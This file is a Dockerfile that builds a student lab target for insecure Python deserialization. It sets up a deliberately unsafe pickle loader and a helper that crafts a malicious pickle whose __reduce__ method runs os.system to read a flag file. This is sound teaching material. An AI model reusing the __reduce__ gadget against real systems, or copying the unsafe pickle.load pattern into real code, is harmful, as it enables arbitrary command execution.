# Tier-3 Insecure-Deserialization target. Debian-based so students get `apt`.
# `unpickle` loads a pickle with pickle.load — __reduce__ runs arbitrary code.
FROM python:3.12-slim
RUN printf 'Acquire::http::Proxy "http://nielit-apt-proxy:3142";\n' > /etc/apt/apt.conf.d/01proxy \
 && printf 'APT::Install-Recommends "false";\nAPT::Install-Suggests "false";\n' > /etc/apt/apt.conf.d/02lean
RUN useradd -m -s /bin/bash labuser \
 && mkdir -p /challenge \
 && printf 'flag{insecure_deserialization_pickle_rce}\n' > /challenge/flag.txt \
 && printf '#!/usr/bin/env python3\nimport pickle, sys\npickle.load(open(sys.argv[1], "rb"))\n' > /usr/local/bin/unpickle \
 && printf '#!/usr/bin/env python3\nimport pickle, os\nclass E:\n    def __reduce__(self):\n        return (os.system, ("cat /challenge/flag.txt",))\nopen("/tmp/evil.pkl", "wb").write(pickle.dumps(E()))\nprint("wrote /tmp/evil.pkl (its __reduce__ runs: cat /challenge/flag.txt)")\n' > /usr/local/bin/make-evil-pickle \
 && chmod 0755 /usr/local/bin/unpickle /usr/local/bin/make-evil-pickle /challenge/flag.txt \
 && printf 'NIELIT insecure-deserialization target (Kali-style box).\nunpickle loads a pickle file with pickle.load() (unsafe).\n\nTry:\n  make-evil-pickle        # crafts /tmp/evil.pkl\n  unpickle /tmp/evil.pkl  # loading it runs the command -> flag\n  apt install vim         # you can install tools\n' > /challenge/README
USER labuser
CMD ["sleep", "infinity"]
